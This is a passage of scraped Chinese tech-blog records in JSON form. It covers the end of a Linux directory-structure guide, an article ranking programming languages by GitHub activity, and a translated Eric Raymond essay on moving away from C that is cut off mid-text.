/dev/fd</strong><strong>：</strong>软驱设备驱动程序。如<strong>：/dev/fd0</strong>指 系统的第一个软盘，也就是通常所说的a盘<strong>，/dev/fd1</strong>指第二个软盘，. . . . . .而<strong>/dev/fd1 h1440</strong>则表示访问驱动器1中的4.5高密盘。<br>\n<strong>5. /dev/st</strong><strong>：</strong>scsi磁带驱动器驱动程序。<br>\n<strong>6. /dev/tty</strong><strong>：</strong>提供虚拟控制台支持。如<strong>：/dev/tty1</strong>指 的是系统的第一个虚拟控制台<strong>，/dev/tty2</strong>则是系统<br>\n的第二个虚拟控制台。<br>\n<strong>7. /dev/pty</strong><strong>：</strong>提供远程登陆伪终端支持。在进行telnet登录时就要用到<strong>/dev/pty</strong>设 备。<br>\n<strong>8. /dev/ttys</strong><strong>：</strong>计算机串行接口，对于dos来说就是“com1”口。<br>\n<strong>9. /dev/cua</strong><strong>：</strong>计算机串行接口，与调制解调器一起使用的设备。<br>\n<strong>10. /dev/null</strong><strong>：</strong>“黑洞”，所有写入该设备的信息都将消失。例如：当想要将屏幕 上的输出信息隐藏起来<br>\n时，只要将输出信息输入到/dev/null中即可。<br>\n<strong>/usr</strong><strong>文件系</strong><strong>统</strong><br>\n<strong>/usr</strong>是个很重要的目录，通常这一文件系统很大，因为所有程序安装在这里。<strong>/usr</strong>里 的所有文件一般来自linux发行版；本地安装的程序和其他东西在<strong>/usr/local</strong>下，因为这样可以在升级新版系 统或新发行版时无须重新安装全部程序。/usr目录下的许多内容是可选的，但这些功能会使用户使用系统更加有效。/usr可容纳许多大型的软件包和它们的 配置文件。下面列出一些重要的目录(一些不太重要的目录被省略了)。<br>\n<strong>1. /usr/x11r6</strong><strong>：</strong>包含x window系统的所有可执行程序、配置文件和支持文件。为简化x的开发和安装，x的文件没有集成到系统中。x window系统是一个功能强大的图形环境，提供了大量的图形工具程序。用户如果对microsoft windows比较熟悉的话，就不会对x window系统感到束手无策了。<br>\n<strong>2. /usr/x386</strong><strong>：</strong>类似<strong>/usr/x11r6</strong> ，但是是专门给x 11 release 5的。<br>\n<strong>3. /usr/bin</strong><strong>：</strong>集中了几乎所有用户命令，是系统的软件库。另有些命令在<strong>/bin</strong>或<strong>/usr/local/bin</strong>中。<br>\n<strong>4. /usr/sbin</strong><strong>：</strong>包括了根文件系统不必要的系统管理命令，例如多数服务程序。<br>\n<strong>5. /usr/man</strong><strong>、/usr/info、/usr/doc：</strong>这些目录包含所有手册页、 gnu信息文档和各种其他文档文件。每个联机手册的“节”都有两个子目录。例如：/usr/man/man1中包含联机手册第一节的源码(没有格式化的原 始文件)，/usr/man/cat1包含第一节已格式化的内容。联机手册分为以下九节：内部命令、系统调用、库函数、设备、文件格式、游戏、宏软件包、 系统管理和核心程序。<br>\n<strong>6. /usr/include</strong><strong>：</strong>包含了c语言的头文件，这些文件多以.h结尾，用来描述c 语言程序中用到的数据结构、<br>\n子过程和常量。为了保持一致性，这实际上应该放在<strong>/usr/lib</strong>下，但习惯上一直沿用了这 个名字。<br>\n<strong>7. /usr/lib</strong><strong>：</strong>包含了程序或子系统的不变的数据文件，包括一些site – wide配置文件。名字lib来源于库(library); 编程的原始库也存在<strong>/usr/lib</strong> 里。当编译程序时，程序便会和其中的库进行连接。也有许多程序把配置文件存入其中。<br>\n<strong>8. /usr/local</strong><strong>：</strong>本地安装的软件和其他文件放在这里。这与/usr很相似。用户 可能会在这发现一些比较大<br>\n的软件包，如tex、emacs等。</p>\n<p><strong>/var</strong><strong>文件系</strong><strong>统</strong><br>\n<strong>/var</strong>包含系统一般运行时要改变的数据。通常这些数据所在的目录的大小是要经常变化或扩充 的。原来/var目录中有些内容是在/usr中的，但为了保持/usr目录的相对稳定，就把那些需要经常改变的目录放到/var中了。每个系统是特定的， 即不通过网络与其他计算机共享。下面列出一些重要的目录(一些不太重要的目录省略了)。<br>\n<strong>1. /var/catman</strong><strong>：</strong>包括了格式化过的帮助(man)页。帮助页的源文件一般存在 /usr/man/catman中；有些man页可能有预格式化的版本，存在/usr/man/cat中。而其他的man页在第一次看时都需要格式化，格 式化完的版本存在/var/man中，这样其他人再看相同的页时就无须等待格式化了。(/<strong>var/catman</strong>经常被 清除，就像清除临时目录一样。)<br>\n<strong>2. /var/lib</strong><strong>：</strong>存放系统正常运行时要改变的文件。<br>\n<strong>3. /var/local</strong><strong>：</strong>存放<strong>/usr/local</strong>中 安装的程序的可变数据(即系统管理员安装的程序)。注意，如果必要，<br>\n即使本地安装的程序也会使用其他/var目录，例如/var/lock 。<br>\n<strong>4. /var/lock</strong><strong>：</strong>锁定文件。许多程序遵循在<strong>/var/lock</strong>中 产生一个锁定文件的约定，以用来支持他们正在<br>\n使用某个特定的设备或文件。其他程序注意到这个锁定文件时，就不会再使用这个设备或文件。<br>\n<strong>5. /var/log</strong><strong>：</strong>各种程序的日志(log)文件，尤其是login (<strong>/var/log/wtmplog</strong>纪 录所有到系统的登录和注销) 和syslog (/<strong>var/log/messages</strong> 纪录存储所有核心和系统程序信息)。/var/log 里的文件经常不确定地增长，应该定期清除。<br>\n<strong>6. /var/run</strong><strong>：</strong>保存在下一次系统引导前有效的关于系统的信息文件。例如<strong>，</strong><strong>/var/run/utmp</strong>包 含当前登录的用户的信息。<br>\n<strong>7. /var/spool</strong><strong>：</strong>放置“假脱机(spool)”程序的目录，如mail、 news、打印队列和其他队列工作的目录。每<br>\n个不同的spool在/var/spool下有自己的子目录，例如，用户的邮箱就存放在/var/spool/mail 中。<br>\n<strong>8. /var/tmp</strong><strong>：</strong>比/tmp允许更大的或需要存在较长时间的临时文件。注意系统管理 员可能不允许/var/tmp有很旧的文件。</p>\n<p><strong>/proc</strong><strong>文件系</strong><strong>统</strong><br>\n<strong>/proc</strong>文件系统是一个伪的文件系统，就是说它是一个实际上不存在的目录，因而这是一个非 常特殊的目录。它并不存在于某个磁盘上，而是由核心在内存中产生。这个目录用于提供关于系统的信息。下面说明一些最重要的文件和目录(/proc文件系统 在proc man页中有更详细的说明)。<br>\n<strong>1. /proc/x</strong><strong>：</strong>关于进程x的信息目录，这x是这一进程的标识号。每个进程在 /proc下有一个名为自己进程号的目录。<br>\n<strong>2. /proc/cpuinfo</strong><strong>：</strong>存放处理器(cpu)的信息，如cpu的类型、制造商、 型号和性能等。<br>\n<strong>3. /proc/devices</strong><strong>：</strong>当前运行的核心配置的设备驱动的列表。<br>\n<strong>4. /proc/dma</strong><strong>：</strong>显示当前使用的dma通道。<br>\n<strong>5. /proc/filesystems</strong><strong>：</strong>核心配置的文件系统信息。<br>\n<strong>6. /proc/interrupts</strong><strong>：</strong>显示被占用的中断信息和占用者的信息，以及被占用 的数量。<br>\n<strong>7. /proc/ioports</strong><strong>：</strong>当前使用的i/o端口。<br>\n<strong>8. /proc/kcore</strong><strong>：</strong>系统物理内存映像。与物理内存大小完全一样，然而实际上没有 占用这么多内存；它仅<br>\n仅是在程序访问它时才被创建。(注意：除非你把它拷贝到什么地方，否则/proc下没有任何东西占用任何磁盘空间。)<br>\n<strong>9. /proc/kmsg</strong><strong>：</strong>核心输出的消息。也会被送到syslog。<br>\n<strong>10. /proc/ksyms</strong><strong>：</strong>核心符号表。<br>\n<strong>11. /proc/loadavg</strong><strong>：</strong>系统“平均负载”；3个没有意义的指示器指出系统当前 的工作量。<br>\n<strong>12. /proc/meminfo</strong><strong>：</strong>各种存储器使用信息，包括物理内存和交换分区 (swap)。<br>\n<strong>13. /proc/modules</strong><strong>：</strong>存放当前加载了哪些核心模块信息。<br>\n<strong>14. /proc/net</strong><strong>：</strong>网络协议状态信息。<br>\n<strong>15. /proc/self</strong><strong>：</strong>存放到查看<strong>/proc</strong>的 程序的进程目录的符号连接。当2个进程查看<strong>/proc</strong>时，这将会是不同<br>\n的连接。这主要便于程序得到它自己的进程目录。<br>\n<strong>16. /proc/stat</strong><strong>：</strong>系统的不同状态，例如，系统启动后页面发生错误的次数。<br>\n<strong>17. /proc/uptime</strong><strong>：</strong>系统启动的时间长度。<br>\n<strong>18. /proc/version</strong><strong>：</strong>核心版本。</p>\n<p><strong>/usr/local</strong><strong>下一般是你安装软件的目录，这个目录就相当于在</strong><strong>windows</strong><strong>下的</strong><strong>programefiles</strong><strong>这个目录</strong><strong>  </strong></p>\n<p><strong>/opt</strong><strong>这个目录是一些大型软件的安装目录，或者是一些服务程序的安装目录</strong></p>\n<p><strong>举个例子：刚才装的测试版</strong><strong>firefox</strong><strong>，就可以装到</strong><strong>/opt/firefox_beta</strong><strong>目录下，</strong><strong>/opt/firefox_beta</strong><strong>目录下面就包含了运 行</strong><strong>firefox</strong><strong>所需要的所有文件、库、数据等等。要删除</strong><strong>firefox</strong><strong>的时候，你只需删除</strong><strong>/opt/firefox_beta</strong><strong>目录即可，非常简单。</strong></p>\n<p><strong>/usr/local</strong></p>\n<p><strong>This is where most manually installed (ie. outside of your package manager) software goes. It has the same structure as /usr. It is a good idea to leave /usr to your package manager and put any custom scripts and things into /usr/local, since nothing important normally lives in /usr/local.</strong></p>\n<p><strong>/usr/local</strong></p>\n<p><strong>这里主要存放那些手动安装的软件，即 不是通过“新立得”或</strong><strong>apt-get</strong><strong>安装的软件 。 它和</strong><strong>/usr</strong><strong>目录具有相类似的目录结构 。让软件包管理器来管理</strong><strong>/usr</strong><strong>目录，而把自定义的脚本</strong><strong>(scripts)</strong><strong>放到</strong><strong>/usr/local</strong><strong>目录下面，我想这应该是个不错的主意。</strong></p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113519\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113519votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113519\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 7 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "praise_numbers": "1"}
{"tags": "IT技术", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2017/01/f9dc3a6611e10b616985757498ed6a74.jpg"], "title": "分析了 7500w+ GitHub 代码仓库 哪门语言热度最高？", "fav_nums": 0, "url": "http://blog.jobbole.com/113546/", "create_date": "2018/01/27", "url_object_id": "20b860929b17a2f1ee48016ac924977a", "comment_nums": 0, "front_image_path": "full/9a8539839727cdcb8492a550ef7b35f838a85f14.jpg", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a target=\"_blank\" href=\"http://www.oschina.net/news/92822/ranking-programming-languages-by-github-users\">开源中国社区</a>   </div><p>近日，有开发者在 reddit <a href=\"https://www.reddit.com/r/programming/comments/7sxser/ranking_programming_languages_by_github_users/\" target=\"_blank\">发布</a>了一个帖子，内容是通过对 GitHub 用户的数据进行分析得到的编程语言排序榜。作者认为，通过计算 GitHub 上有多少人使用每种语言来对所有的编程语言进行排序会很有趣。</p>\n<p>下面我们不妨看看这份数据源“独特”的排行榜有哪些值得关注的东西。</p>\n<p>首先，作者表示这次分析的数据主要来源于 <a href=\"https://www.githubarchive.org/\" target=\"_blank\">GitHub Archive</a> 和 <a href=\"http://ghtorrent.org/\" target=\"_blank\">GHTorrent</a>。他通过分析 GitHub Archive 上 7500w+ 个不同的仓库中超过 12.5 亿次的事件（包括推送新代码、fork、star、issue 处理等），每月汇总一次，计算了每种语言的 MAU(月活跃用户数量)，详细的分析说明可<a href=\"https://github.com/benfred/github-analysis/#inferring-languages\" target=\"_blank\">点此查看</a>。</p>\n<p>先看看总体数据，截至 2018 年 1 月 24 日，通过统计 GitHub 上活跃用户的活动情况，对每种语言的排名结果如下(TOP 25)：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/01/fc887734f13170721d21150266c78b0f.png\" alt=\"\"></p>\n<p>整体排名十分有趣，但我们应该深入了解这些语言随着时间的推移有着怎么的演变。（数据可以追溯到 7 年前）</p>\n<p><strong>主流编程语言</strong></p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/01/9f50396b32bcc8cd904aa87e9e97086e.png\" alt=\"\"></p>\n<p>可以看到，主流编程语言都有着相对稳定的用户群，而且大多数也都是你意料之中的。</p>\n<p>从追踪的数据来看，JavaScript, Python, Java, C++ 和 C 保持这种热度的势头已经超过 7 年，所以近段时间依然不会有所改变。</p>\n<p>JavaScript 保持它的“龙头”地位是可以解释的，因为它基本上是所有程序员都需要使用的一门语言。</p>\n<p>不过随着时间的推移，Python 的使用者越来越多，最近已超过 Java 成为 GitHub 上第二大流行的编程语言。Python 的增长大部分似乎都来自开发者对机器学习的兴趣。事实上，Python 的整体流行度在这里可能被低估了（以后可能会更多）。</p>\n<p>C++ 似乎也正在超越 C 的地位，而这也是有根据的，像 GCC 这种项目都已经从 C 转换到 C++，以便使用 C++ 的一些特性。由于 C++ 基本上是 C 的超集，GCC 团队发现<a href=\"https://lwn.net/Articles/542457/\" target=\"_blank\">使用 C++ 的有限子集可让他们编写更干净的代码</a>。</p>\n<p><strong>2018 年要学习的编程语言</strong></p>\n<p>观察这种编程语言趋势的最好方法就是，确定具有快速增长的用户群的新兴编程语言：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/01/d8411b438b8276b946a43f1a946b143f.png\" alt=\"\"></p>\n<p>明显能看到，用户群增长最快的语言分别有：Go，TypeScript，Kotlin 和 Rust。</p>\n<p>作者表示，在过去的几周里他也一直在学习 Go 和 Typescript。他发现，对于编写并发的服务器端程序，Go 确实非常有用，而在使用 TypeScript 几个星期后，自己可能再也不会乐意使用 JavaScript 了。</p>\n<p>Kotlin 的崛起是意料之中的，Kotlin 主要用于 Android 应用程序开发，当被宣布成为 Android 开发的官方支持语言后，看看图中的斜率变化情况。</p>\n<p>对于 Rust，在这里的增长虽然比其他语言慢，但其中依然有许多令人惊叹的项目。作者推荐了两个用 Rust 编写的两个项目 —— <a href=\"https://github.com/rbspy/rbspy\" target=\"_blank\">用于 Ruby 的采样分析器</a>和 <a href=\"https://github.com/maciejkula/wyrm\" target=\"_blank\">autodifferentiation 框架</a>。</p>\n<p>事实上，所有这些语言都有一个共同点，它们背后都有大公司在支持着。正如谷歌之于 Go，微软之于 TypeScript，JetBrains 之于 Kotlin，Mozilla 之于 Rust。成功推广一门新的语言需要不少的付出 —— 至少仅仅开发出一门优雅的语言是不够的，还必须扩大语言背后的社区和生态系统。诸如 IDE 支持，用于常见任务的库和软件包、工具和文档，这些对于让用户使用某种语言都非常重要，而且都需要付出巨大的努力。</p>\n<p><strong>出现下滑趋势的语言</strong></p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/01/52a6027178298cf4ac5fcb4fd2cdfca6.png\" alt=\"\"></p>\n<p>在过去的 7 年里，Ruby，PHP，Objective-C，CoffeeScript 和 Perl 在 GitHub 上的用户比例都显着下降。</p>\n<p>不过值得注意的是，这些数据是以 GitHub 用户群的百分比得出的，而 GitHub 的用户数量正在快速增长。在过去的 7 年中，GitHub 的用户增长已经超过了 20 倍。这意味着即使是市场份额下降的语言也可能拥有不断增长的用户群。</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/01/0cb76bf1f6742f4bffa034266b101d3a.png\" alt=\"\"></p>\n<p>这样来看，相比 2011 年，使用 Ruby 语言的活跃用户数量已经超过了3倍。它的增长没有其他语言那么快，导致它在这个分析上的表现相对较差。</p>\n<p>此外要注意的是，某些较新的语言似乎在蚕食旧版语言的用户群。例如，Objective-C 用户的下降与 Swift 的上升相对应。另外，CoffeeScript 似乎已经被 TypeScript 取代：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/01/1bbc04d35c7761d2c22bbab0a085feaf.png\" alt=\"\"></p>\n<p>虽然 Objective-C 正在下滑，但整体上 iOS 开发相对稳定。同样的，CoffeeScript 似乎已经为 TypeScript 铺平了道路，因为它让程序员习惯于将代码编译成 JavaScript。</p>\n<p><strong>函数式编程语言</strong></p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/01/c44dae18e5d68f2769917e1d42df0ee9.png\" alt=\"\"></p>\n<p>作者表示，这里的数据相对较少，排名中的干扰因素较多，他不相信随着时间的推移，Clojure 和 Haskell 会出现这样明显的下滑。而 Elixir 这门语言值得大家留意，虽然未能排在前 25 名。</p>\n<p>文中作者还对用于科学领域的语言进行了分析，详情可查看<a href=\"http://www.benfrederickson.com/ranking-programming-languages-by-github-users/\" target=\"_blank\">原文</a>。作者还表示未来对编程语言流行度的跟踪将会参考其他一些数据，如 TIOBE 指数、Stack Overflow 上的标签趋势图、GitHub Octoverse 等。</p>\n<p>源码和整体排名可在 <a href=\"https://github.com/benfred/github-analysis\" target=\"_blank\">GitHub</a> 上查看。</p>\n<p>最后，reddit 帖子的回帖中，有用户给出了自己统计的数据以进行对比参考，他统计了 reddit 上十大最受欢迎的编程语言的 subreddits 数量（ subreddits 是 reddit 中的子版块，用户可根据自己的兴趣和需要进行订阅）</p>\n<blockquote><p>Python – 213594<br>\nJavaScript – 199592<br>\nJava – 81241<br>\nPHP – 58794<br>\nC++ – 58788<br>\nC# – 52103<br>\nGo – 39529<br>\nRuby – 38405<br>\nRust – 33124<br>\nC – 32351</p></blockquote>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113546\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113546votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113546\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i>  收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "praise_numbers": "1"}
{"tags": "C/C++", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/01/5f9c96a67bd10a4615ff06707ba2295f.jpg"], "title": "与 C 语言长别离", "fav_nums": 1, "url": "http://blog.jobbole.com/113538/", "create_date": "2018/01/26", "url_object_id": "7804089960a8b7ca460bb1b60e30fcd6", "comment_nums": 2, "front_image_path": "full/4bd39b61ac115b0fa2ba173dd3b4e750ad79564a.jpg", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"http://esr.ibiblio.org/?p=7711\"> Eric Raymond</a>   译文出处：<a target=\"_blank\" href=\"https://linux.cn/article-9268-1.html\"> Yu Haixin</a>   </div><div id=\"article_content\">\n<div> 这几天来，我在思考那些正在挑战 C 语言的系统编程语言领袖地位的新潮语言，尤其是 Go 和 Rust。思考的过程中，我意识到了一个让我震惊的事实 —— 我有着 35 年的 C 语言经验。每周我都要写很多 C 代码，但是我已经记不清楚上一次我 <em>创建一个新的 C 语言项目</em> 是在什么时候了。</div>\n<div><a href=\"http://jbcdn2.b0.upaiyun.com/2018/01/5f9c96a67bd10a4615ff06707ba2295f.jpg\"><img class=\"aligncenter size-full wp-image-113540\" src=\"http://jbcdn2.b0.upaiyun.com/2018/01/5f9c96a67bd10a4615ff06707ba2295f.jpg\" alt=\"timg\"></a></div>\n<p>如果你完全不认为这种情况令人震惊，那你很可能不是一个系统程序员。我知道有很多程序员使用更高级的语言工作。但是我把大部分时间都花在了深入打磨像 NTPsec、 GPSD 以及 giflib 这些东西上。熟练使用 C 语言在这几十年里一直就是我的专长。但是，现在我不仅是不再使用 C 语言写新的项目，甚至我都记不清我是什么时候开始这样做的了，而且……回头想想，我觉得这都不是本世纪发生的事情。</p>\n<p>这个对于我来说是件大事，因为如果你问我，我的五个最核心软件开发技能是什么，“C 语言专家” 一定是你最有可能听到的之一。这也激起了我的思考。C 语言的未来会怎样 ？C 语言是否正像当年的 COBOL 语言一样，在辉煌之后，走向落幕？</p>\n<p>我恰好是在 C 语言迅猛发展，并把汇编语言以及其它许多编译型语言挤出主流存在的前几年开始编程的。那场过渡大约是在 1982 到 1985 年之间。在那之前，有很多编译型语言争相吸引程序员的注意力，那些语言中还没有明确的领导者；但是在那之后，小众的语言就直接毫无声息的退出了舞台。主流的语言（FORTRAN、Pascal、COBOL）则要么只限于老代码，要么就是固守单一领域，再就是在 C 语言的边缘领域顶着愈来愈大的压力苟延残喘。</p>\n<p>而在那以后，这种情形持续了近 30 年。尽管在应用程序开发上出现了新的动向： Java、 Perl、 Python， 以及许许多多不是很成功的竞争者。起初我很少关注这些语言，这很大一部分是因为在它们的运行时的开销对于当时的实际硬件来说太大。因此，这就使得 C 的成功无可撼动；为了使用和对接大量已有的 C 语言代码，你得使用 C 语言写新代码（一部分脚本语言尝试过打破这种壁垒，但是只有 Python 有可能取得成功）。</p>\n<p>回想起来，我在 1997 年使用脚本语言写应用时本应该注意到这些语言的更重要的意义的。当时我写的是一个名为 SunSITE 的帮助图书管理员做源码分发的辅助软件，当时使用的是 Perl 语言。</p>\n<p>这个应用完全是用来处理文本输入的，而且只需要能够应对人类的反应速度即可（大概 0.1 秒），因此使用 C 或者别的没有动态内存分配以及字符串类型的语言来写就会显得很傻。但是在当时，我仅仅是把其视为一个试验，而完全没有想到我几乎再也不会在一个新项目的第一个文件里敲下 <code>int main(int argc, char **argv)</code> 这样的 C 语言代码了。</p>\n<p>我说“几乎”，主要是因为 1999 年的 <a href=\"http://sng.sourceforge.net/\">SNG</a>。 我想那是我最后一个用 C 从头开始写的项目了。</p>\n<p>在那之后我写的所有的 C 代码都是在为那些上世纪已经存在的老项目添砖加瓦，或者是在维护诸如 GPSD 以及 NTPsec 一类的项目。</p>\n<p>当年我本不应该使用 C 语言写 SNG 的。因为在那个年代，摩尔定律的快速迭代使得硬件愈加便宜，使得像 Perl 这样的语言的执行效率也不再是问题。仅仅三年以后，我可能就会毫不犹豫地使用 Python 而不是 C 语言来写 SNG。</p>\n<p>在 1997 年我学习了 Python， 这对我来说是一道分水岭。这个语言很美妙 —— 就像我早年使用的 Lisp 一样，而且 Python 还有很酷的库！甚至还完全遵循了 POSIX！还有一个蛮好用的对象系统！Python 没有把 C 语言挤出我的工具箱，但是我很快就习惯了在只要能用 Python 时就写 Python ，而只在必须使用 C 语言时写 C。</p>\n<p>（在此之后，我开始在我的访谈中指出我所谓的 “Perl 的教训” ，也就是任何一个没能实现和 C 语言语义等价的遵循 POSIX 的语言<em>都注定要失败</em>。在计算机科学的发展史上，很多学术语言的骨骸俯拾皆是，原因是这些语言的设计者没有意识到这个重要的问题。）</p>\n<p>显然，对我来说，Python 的主要优势之一就是它很简单，当我写 Python 时，我不再需要担心内存管理问题或者会导致核心转储的程序崩溃 —— 对于 C 程序员来说，处理这些问题烦的要命。而不那么明显的优势恰好在我更改语言时显现，我在 90 年代末写应用程序和非核心系统服务的代码时，为了平衡成本与风险都会倾向于选择具有自动内存管理但是开销更大的语言，以抵消之前提到的 C 语言的缺陷。而在仅仅几年之前（甚至是 1990 年），那些语言的开销还是大到无法承受的；那时硬件产业的发展还在早期阶段，没有给摩尔定律足够的时间来发挥威力。</p>\n<p>尽量地在 C 语言和 Python 之间选择 C —— 只要是能的话我就会从 C 语言转移到 Python 。这是一种降低工程复杂程度的有效策略。我将这种策略应用在了 GPSD 中，而针对 NTPsec , 我对这个策略的采用则更加系统化。这就是我们能把 NTP 的代码库大小削减四分之一的原因。</p>\n<p>但是今天我不是来讲 Python 的。尽管我觉得它在竞争中脱颖而出，Python 也未必真的是在 2000 年之前彻底结束我在新项目上使用 C 语言的原因，因为在当时任何一个新的学院派的动态语言都可以让我不再选择使用 C 语言。也有可能是在某段时间里在我写了很多 Java 之后，我才慢慢远离了 C 语言。</p>\n<p>我写这个回忆录是因为我觉得我并非特例，在世纪之交，同样的发展和转变也改变了不少 C 语言老手的编码习惯。像我一样，他们在当时也并没有意识到这种转变正在发生。</p>\n<p>在 2000 年以后，尽管我还在使用 C/C++ 写之前的项目，比如 GPSD ，游戏韦诺之战以及 NTPsec，但是我的所有新项目都是使用 Python 的。</p>\n<p>有很多程序是在完全无法在 C 语言下写出来的，尤其是 <a href=\"http://www.catb.org/esr/reposurgeon/\">reposurgeon</a> 以及 <a href=\"http://www.catb.org/esr/doclifter/\">doclifter</a> 这样的项目。由于 C 语言受限的数据类型本体论以及其脆弱的底层数据管理问题，尝试用 C 写的话可能会很恐怖，并注定失败。</p>\n<p>甚至是对于更小的项目 —— 那些可以在 C 中实现的东西 —— 我也使用 Python 写，因为我不想花不必要的时间以及精力去处理内核转储问题。这种情况一直持续到去年年底，持续到我创建我的第一个 Rust 项目，以及成功写出第一个<a href=\"http://www.catb.org/esr/loccount/\">使用 Go 语言的项目</a>。</p>\n<p>如前文所述，尽管我是在讨论我的个人经历，但是我想我的经历体现了时代的趋势。我期待新潮流的出现，而不是仅仅跟随潮流。在 98 年的时候，我就是 Python 的早期使用者。来自 <a href=\"https://www.tiobe.com/tiobe-index/\">TIOBE</a> 的数据则表明，在 Go 语言脱胎于公司的实验项目并刚刚从小众语言中脱颖而出的几个月内，我就开始实现自己的第一个 Go 语言项目了。</p>\n<p>总而言之：直到现在第一批有可能挑战 C 语言的传统地位的语言才出现。我判断这个的标准很简单 —— 只要这个语言能让我等 C 语言老手接受不再写 C 的事实，这个语言才 “有可能” 挑战到 C 语言的地位 —— 来看啊，这有个新编译器，能把 C 转换到新语言，现在你可以让他完成你的<em>全部工作</em>了 —— 这样 C 语言的老手就会开心起来。</p>\n<p>Python 以及和其类似的语言对此做的并不够好。使用 Python 实现 NTPsec（以此举例）可能是个灾难，最终会由于过高的运行时开销以及由于垃圾回收机制导致的延迟变化而烂尾。如果需求是针对单个用户且只需要以人类能接受的速度运行，使用 Python 当然是很好的，但是对于以 <em>机器的速度</em> 运行的程序来说就不总是如此了 —— 尤其是在很高的多用户负载之下。这不只是我自己的判断 —— 因为拿 Go 语言来说，它的存在主要就是因为当时作为 Python 语言主要支持者的 Google 在使用 Python 实现一些工程的时候也遭遇了同样的效能痛点。</p>\n<p>Go 语言就是为了解决 Python 搞不定的那些大多由 C 语言来实现的任务而设计的。尽管没有一个全自动语言转换软件让我很是不爽，但是使用 Go 语言来写系统程序对我来说不算麻烦，我发现我写 Go 写的还挺开心的。我的很多 C 编码技能还可以继续使用，我还收获了垃圾回收机制以及并发编程机制，这何乐而不为？</p>\n<p>（<a href=\"https://blog.ntpsec.org/2017/02/07/grappling-with-go.html\">这里</a>有关于我第一次写 Go 的经验的更多信息）</p>\n<p>本来我想把 Rust 也视为 “C 语言要过时了” 的例证，但是在学习并尝试使用了这门语言编程之后，我觉得<a href=\"http://esr.ibiblio.org/?p=7303\">这种语言现在还没有做好准备</a>。也许 5 年以后，它才会成为 C 语言的对手。</p>\n<p>随着 2017 的尾声来临，我们已经发现了一个相对成熟的语言，其和 C 类似，能够胜任 C 语言的大部分工作场景（我在下面会准确描述），在几年以后，这个语言界的新星可能就会取得成功。</p>\n<p>这件事意义重大。如果你不长远地回顾历史，你可能看不出来这件事情的伟大性。<em>三十年了</em> —— 这几乎就是我作为一个程序员的全部生涯，我们都没有等到一个 C 语言的继任者，也无法遥望 C 之后的系统编程会是什么样子的。而现在，我们面前突然有了后 C 时代的两种不同的展望和未来……</p>\n<p>……另一种展望则是下面这个语言留给我们的。我的一个朋友正在开发一个他称之为 “Cx” 的语言，这个语言在 C 语言上做了很少的改动，使得其能够支持类型安全；他的项目的目的就是要创建一个能够在最少人力参与的情况下把古典 C 语言修改为新语言的程序。我不会指出这位朋友的名字，免得给他太多压力，让他做出太多不切实际的保证。但是他的实现方法真的很是有意思，我会尽量给他募集资金。</p>\n<p>现在，我们看到了可以替代 C 语言实现系统编程的三种不同的可能的道路。而就在两年之前，我们的眼前还是一片漆黑。我重复一遍：这件事情意义重大。</p>\n<p>我是在说 C 语言将要灭绝吗？不是这样的，在可预见的未来里，C 